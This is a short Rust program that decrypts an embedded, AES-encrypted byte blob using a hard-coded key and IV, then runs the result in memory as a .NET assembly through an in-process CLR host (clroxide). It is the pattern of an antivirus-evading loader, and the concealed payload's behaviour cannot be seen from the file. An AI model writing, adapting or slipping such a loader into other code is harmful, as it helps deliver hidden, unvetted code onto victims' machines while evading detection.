use aes::cipher::{KeyIvInit, BlockDecryptMut, block_padding::Pkcs7};
use clroxide::clr::Clr;

fn decrypt_aes(buf: &mut Vec<u8>) {

    let key: [u8; 16] = [0x1f,0x8a,0x23,0x75,0x2e,0x3e,0x28,0xf6,0x39,0xa9,0x7d,0x55,0x86,0xc4,0x26,0x91];
    let iv: [u8; 16]  = [0x31,0xdf,0xc6,0x02,0x24,0x64,0xfc,0xe1,0x37,0x79,0xce,0x68,0x87,0x3e,0x8b,0x97];

    type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;

    Aes128CbcDec::new(&key.into(), &iv.into()).decrypt_padded_mut::<Pkcs7>(buf.as_mut_slice()).unwrap();
}

fn main() {

    let mut bin_data: Vec<u8> = vec![0x4d,0xf4,0x76,0x8d,0xe5,0x8c,0xc0,0x66,0x94,0x28,0x22,0x83,0x75,0x60,0x28,0x3c,0x8d,0x15,0x82,0xf0,0xa2,0x31,0x10,0xa1,0x1d,0x29,0x0f,0xcb,0xdf,0x6a,0xea,0x1c,0xef,0x59,0xfa,0xec,0x41,0x86,0x34,0x79,0x55,0xe0,0x5d,0xe0,0xb6,0x63,0xc5,0xd0,0xce,0x69,0x6b,0x37,0x34,0x5d,0x19,0x5c,0xb1,0xfe,0xeb,0x9c,0x04,0xbf,0x6a,0x08,0xbe,0xfd,0x8d,0x9f,0xb4,0x71,0xf0,0xa0,0x62,0xf4,0xe0,0x58,0x31,0xe4,0x8b,0x1d,0x1d,0x0c,0xde,0xa0,0xa6,0xeb,0x66,0x0c,0xac,0xe2,0x0b,0x9d,0xdf,0x8b,0x34,0x16,0xa0,0x3a,0x1e,0x2c,0xf9,0x48,0x6e,0x41,0x47,0x1a,0x4f,0xf5,0x75,0xf9,0x13,0xbf,0x50,0x03,0x37,0xf7,0x6c,0x46,0x8c,0x12,0xdc,0x21,0xbb,0xc5,0x73,0x1c,0x5e,0x35,0xc6,0x14,0xa5,0x53,0x0d,0x8b,0xe5,0x5a,0xc5,0x32,0x05,0xc4,0x09,0x0e,0x4f,0x33,0x87,0x55,0x79,0x8d,0x47,0x1c,0xa7,0x4d,0xfe,0x72,0xf0,0xb6,0x88,0xfe,0x47,0xbe,0x58,0x2d,0x6b,0xfc,0x4c,0x9b,0x82,0xad,0xea,0x36,0x4f,0x70,0x1f,0x8d,0xe2,0x4e,0xca,0xc1,0xb2,0x4d,0x0f,0x6e,0x12,0xd2,0x6f,0x2f,0xd1,0x6b,0x2a,0xb4,0xb1,0x78,0x0c,0xd3,0xe5,0xf7,0x9f,0x28,0xa2,0x46,0x46,0x97,0xdf,0x5a,0x89,0x2e,0xb7,0x23,0x1d,0x3a,0x16,0x71,0x26,0xc2,0x2d,0x10,0x62,0xbd,0xef,0x79,0x60,0x76,0x61,0x1c,0x7e,0x24,0x82,0x40,0xd6,0xdb,0xd7,0xbc,0xd3,0x53,0x44,0x6f,0x66,0xa2,0xd1,0xe6,0xb9,0x1a,0xa8,0x55,0xfc,0x03,0x4b,0xd6,0x77,0x8b,0xca,0x72,0x70,0xb3,0x33,0x34,0x92,0x10,0x2c,0x6b,0x64,0x18,0xec,0x5f,0x8e,0x10,0x56,0x07,0xf3,0x91,0xab,0x80,0x3c,0x28,0x27,0x2a,0x83,0xe9,0x00,0xaa,0x7d,0x8a,0xfc,0x66,0x19,0xb5,0x66,0x2e,0x2c,0x02,0xaf,0x22,0xa6,0x8e,0xda,0xe7,0x43,0xa4,0x49,0x6a,0xc7,0x91,0x38,0xf0];

    let args: Vec<String> = vec![];
    
    decrypt_aes(&mut bin_data);
    let mut clr: Clr = Clr::new(bin_data, args).unwrap();

    let result: String = clr.run().unwrap();

    println!("{}", result);
}